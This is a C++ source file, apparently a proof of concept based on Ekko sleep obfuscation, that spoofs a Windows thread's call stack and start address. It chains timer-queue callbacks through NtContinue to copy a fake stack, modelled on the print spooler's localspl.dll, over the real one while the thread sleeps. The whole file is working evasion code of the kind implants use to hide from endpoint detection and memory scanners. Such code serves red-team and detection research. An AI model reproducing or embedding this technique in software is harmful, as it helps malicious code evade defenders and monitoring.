#include "CallStackUtils.h"

// Static spoofed call stack taken from spoolsv.exe via SysInternals' Process Explorer.
//   ntdll.dll!NtWaitForSingleObject + 0x14
//   KERNELBASE.dll!WaitForSingleObjectEx + 0x8e
//   localspl.dll!InitializePrintMonitor2 + 0xb7a
//   KERNEL32.DLL!BaseThreadInitThunk + 0x14
//   ntdll.dll!lRtlUserThreadStart + 0x21
// Start address: localspl.dll!InitializePrintMonitor2 + 0xb20.
std::vector<StackFrame> spoofedCallStack =
{
    StackFrame(L"C:\\Windows\\SYSTEM32\\kernelbase.dll", "WaitForSingleObjectEx", 0x8e, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\localspl.dll", "InitializePrintMonitor2", 0xb7a, 0 , TRUE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\kernel32.dll", "BaseThreadInitThunk", 0x14, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", "RtlUserThreadStart", 0x21, 0, FALSE),
};

// Global struct to store target thread info.
threadToSpoof targetThreadToSpoof = {};

void MaskCallStack(DWORD SleepTime)
{
    CONTEXT ctxThread = { 0 };

    CONTEXT ropBackUpStack = { 0 };
    CONTEXT ropSpoofStack = { 0 };
    CONTEXT ropRestoreStack = { 0 };
    CONTEXT ropSetEvent = { 0 };

    HANDLE hTimerQueue = NULL;
    HANDLE hNewTimer = NULL;
    HANDLE hEvent = NULL;
    HANDLE hHeap = NULL;

    PVOID pNtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");

    hTimerQueue = CreateTimerQueue();
    hEvent = CreateEventW(0, 0, 0, 0);

    PVOID pCopyOfStack = NULL;
    void* pChildSP = NULL;
    void* pRsp = NULL;

    // [1] Create a buffer to back up current state of stack.
    hHeap = GetProcessHeap();
    pCopyOfStack = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, targetThreadToSpoof.totalRequiredStackSize);

    // [2] Work out Child-SP of current frame.
    pChildSP = GetChildSP();

    // [3] Calculate Rsp at the point when NtWaitForSingleObject sys call
    // is invoked so we know *where* to overwrite in memory.
    // Subtract from current Child-SP stack size of KERNELBASE!WaitForSingleObject + NtWaitForSingleObject (0x8).
    pRsp = (PCHAR)pChildSP - spoofedCallStack.front().totalStackSize - 0x8;
    //std::cout << "[+] Child-SP of current frame: 0x" << std::hex << pChildSP << "\n";
    //std::cout << "[+] Value of Rsp when NtWaitForSingleObject syscall is invoked: 0x" << std::hex << pRsp << "\n";

    // [4] Set up timers.
    if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &ctxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
    {
        WaitForSingleObject(hEvent, 0x32);

        memcpy(&ropBackUpStack, &ctxThread, sizeof(CONTEXT));
        memcpy(&ropSpoofStack, &ctxThread, sizeof(CONTEXT));
        memcpy(&ropRestoreStack, &ctxThread, sizeof(CONTEXT));
        memcpy(&ropSetEvent, &ctxThread, sizeof(CONTEXT));

        // Back up the stack.
        // NB This PoC uses VCRUNTIME140!memcpy but a native equivalent exported by ntdll is RtlCopyMemoryNonTemporal.
        // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemorynontemporal
        ropBackUpStack.Rsp -= 8;
        ropBackUpStack.Rip = (DWORD64)memcpy; // VCRUNTIME140!memcpy
        ropBackUpStack.Rcx = (DWORD64)pCopyOfStack; // Destination
        ropBackUpStack.Rdx = (DWORD64)pRsp; // Source
        ropBackUpStack.R8 = (DWORD64)targetThreadToSpoof.totalRequiredStackSize; // Length

        // Overwrite the stack with fake callstack.
        ropSpoofStack.Rsp -= 8;
        ropSpoofStack.Rip = (DWORD64)memcpy;
        ropSpoofStack.Rcx = (DWORD64)pRsp; // Destination
        ropSpoofStack.Rdx = (DWORD64)targetThreadToSpoof.pFakeStackBuffer; // Source
        ropSpoofStack.R8 = (DWORD64)targetThreadToSpoof.totalRequiredStackSize;  // Length

        // Restore original call stack.
        ropRestoreStack.Rsp -= 8;
        ropRestoreStack.Rip = (DWORD64)memcpy;
        ropRestoreStack.Rcx = (DWORD64)pRsp; // Destination
        ropRestoreStack.Rdx = (DWORD64)pCopyOfStack; // Source
        ropRestoreStack.R8 = (DWORD64)targetThreadToSpoof.totalRequiredStackSize; // Length

        // Set event.
        ropSetEvent.Rsp -= 8;
        ropSetEvent.Rip = (DWORD64)SetEvent;
        ropSetEvent.Rcx = (DWORD64)hEvent;

        std::cout << "[+] Masking call stack of main thread...\n";
        // The timings here could be modified as there is a small window when call stack is unmasked.
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ropBackUpStack, 1, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ropSpoofStack, 10, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ropRestoreStack, SleepTime, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ropSetEvent, SleepTime + 10, 0, WT_EXECUTEINTIMERTHREAD);
    }

    // [5] Wait for event to be set by timer. Call stack will be masked throughout this period.
    WaitForSingleObject(hEvent, INFINITE);

    // [6] Clean up.
    std::cout << "[+] Call stack currently unmasked...\n";
    DeleteTimerQueue(hTimerQueue);
    HeapFree(hHeap, 0, pCopyOfStack);
}

void go()
{
    do
        MaskCallStack(15000);
    while (TRUE);
}

int main(int argc, char* argv[])
{
    std::cout << "[+] Dynamic call stack spoofer via timers by @joehowwolf. Based on Ekko Sleep Obfuscation by C5pider.\n";
    std::cout << "[!] Currently only supports waits of WaitReason: UserRequest via KERNELBASE!WaitForSingleObjectEx.\n";

    BOOL bStaticCallStack = true;
    PVOID startAddr = 0;
    HANDLE hThread = INVALID_HANDLE_VALUE;
    DWORD dwThreadId = 0;
    CONTEXT ctx = { 0 };

    // [0] Determine if the stack mask is to be static or dynamically spoofed.
    if (!NT_SUCCESS(HandleArgs(argc, argv, bStaticCallStack)))
    {
        return -1;
    }

    // [1] Initialise spoofed call stack.
    if (bStaticCallStack)
    {
        // Create a fake call stack layout in memory from static struct.
        std::cout << "[+] STATIC MODE: Initialising static call stack to spoof...\n";
        if (!NT_SUCCESS(InitialiseStaticCallStackSpoofing(spoofedCallStack, targetThreadToSpoof)))
        {
            std::cout << "[-] Failed to initialise fake static call stack\n";
            return -1;
        }

        // Set thread start address to localspl.dll!InitializePrintMonitor2 + 0xb20.
        startAddr = (PCHAR)(GetProcAddress(GetModuleHandleA("localspl"), "InitializePrintMonitor2")) + 0xb20;
        if (NULL == startAddr)
        {
            return -1;
        }
    }
    else
    {
        // Create a fake call stack by finding a thread in the desired state (e.g. wait:UserRequest)
        // and record its start address. Do this upfront because we *need* to know the start
        // address in order to spoof it now.
        std::cout << "[+] DYNAMIC MODE: Finding a suitable thread call stack to spoof...\n";
        if (!NT_SUCCESS(InitialiseDynamicCallStackSpoofing(UserRequest, targetThreadToSpoof)))
        {
            std::cout << "[-] Failed to initialise dynamic static call stack\n";
            return -1;
        }
        startAddr = targetThreadToSpoof.startAddr;
    }

    // [2] Start thread at fake start address.
    std::cout << "[+] Spawning new thread at spoofed start address: 0x" << std::hex << startAddr << "\n";
    hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)startAddr,
        0,
        CREATE_SUSPENDED,
        &dwThreadId);
    ctx.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(hThread, &ctx);
    ctx.Rip = (DWORD64)&go;
    SetThreadContext(hThread, &ctx);

    // [3] Resume thread.
    ResumeThread(hThread);
    CloseHandle(hThread);

    // [4] Exit current thread.
    ExitThread(0);
}
